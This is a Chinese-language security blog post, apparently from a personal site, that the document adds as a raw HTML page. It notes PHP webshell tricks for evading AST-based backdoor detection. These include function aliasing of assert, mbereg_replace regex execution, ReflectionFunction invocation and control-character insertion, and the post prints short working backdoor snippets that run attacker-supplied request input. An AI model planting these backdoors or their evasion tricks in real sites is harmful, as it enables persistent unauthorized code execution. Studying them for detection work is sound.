@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP后门&amp;特性记录 | chriskali&#39;s blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://chriskalix.github.io/favicon.ico?v=1592112345647">
+<link rel="stylesheet" href="https://chriskalix.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+这两天读了P牛的文章，正好群里的大佬发出了文章用到了Tricks。由于php审计还处于不成熟阶段，记录一下读后感受
+
+PHP的特性&amp;检测
+通常的，常见的php webshell很容易被吃。前段时间处理网站被挂马，马都比较明显，要么..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://chriskalix.github.io">
+        <img src="https://chriskalix.github.io/images/avatar.png?v=1592112345647" class="site-logo">
+        <h1 class="site-title">chriskali&#39;s blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      Keep learning
+    </div>
+    <div class="site-footer">
+      chriskalix | <a class="rss" href="https://chriskalix.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PHP后门&amp;特性记录</h2>
+            <div class="post-date">2020-06-14</div>
+            
+            <div class="post-content" v-pre>
+              <blockquote>
+<p>这两天读了P牛的文章，正好群里的大佬发出了文章用到了Tricks。由于php审计还处于不成熟阶段，记录一下读后感受</p>
+</blockquote>
+<h2 id="php的特性检测">PHP的特性&amp;检测</h2>
+<p>通常的，常见的php webshell很容易被吃。前段时间处理网站被挂马，马都比较明显，要么是混淆要么是回调，这种往往是因为没有前置一个较好的webshell检测，有的话这么简单的马应该是传不上来的。<br>
+这时我问我自己，如果是我来上传马，我会怎么做？我发现我的想法也比较局限，无非就是正则执行，回调，加密混淆等等😅。此时看到P牛的文章，感觉十分神奇，记录一下</p>
+<h2 id="前置知识">前置知识</h2>
+<p>文章中提到了针对一个回调型后门，检测引擎会如何检测：</p>
+<ol>
+<li>遍历AST树</li>
+<li>分析<code>FuncCall Node</code>判断是否有回调</li>
+<li>回调是否是一个变量</li>
+</ol>
+<h2 id="函数别名">函数别名</h2>
+<p>我能想到的正则执行，在PHP7后已经被删除了。mb_ereg_replace和mb_eregi_replace这两个函数依然可以，他们的别名mbereg_replace和mbereg_ireplace也能执行任意代码。P牛演示的代码段为</p>
+<pre><code class="language-php">&lt;?php
+mbereg_replace('.*', '\0', $_REQUEST[2333], 'mer');
+</code></pre>
+<p>在PHP7.2.9的环境中报错，切换到低版本后没有问题了<br>
+上述的是一个引子，通用的方法是自己来申明函数的别名，例如</p>
+<pre><code class="language-php">&lt;?php
+use function \assert as test;
+test($_POST[2333]);
+</code></pre>
+<p>以及PHP7的</p>
+<pre><code class="language-php">&lt;?php
+$f = new class($_POST['name']) extends ReflectionFunction {};
+$f-&gt;invoke($_POST[2333]);
+</code></pre>
+<p><strong>神奇的trick</strong></p>
+<pre><code class="language-php">printf&lt;char&gt;('hello world')
+</code></pre>
+<p>其中<char>的范围是[\x00-\x20],PHP会忽略这个控制字符，也是一个绕过的tricks（PHP-Parser是无法正确解析的）</p>
+<h2 id="文章总结">文章总结</h2>
+<ol>
+<li>别名</li>
+<li>重命名</li>
+<li>参数名位置(变长参数)</li>
+<li>控制字符(重点)</li>
+<li>PHP标签</li>
+</ol>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/">
+                  <h3 class="post-title">
+                    Thinkphp 5.0.24 反序列化链分析
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
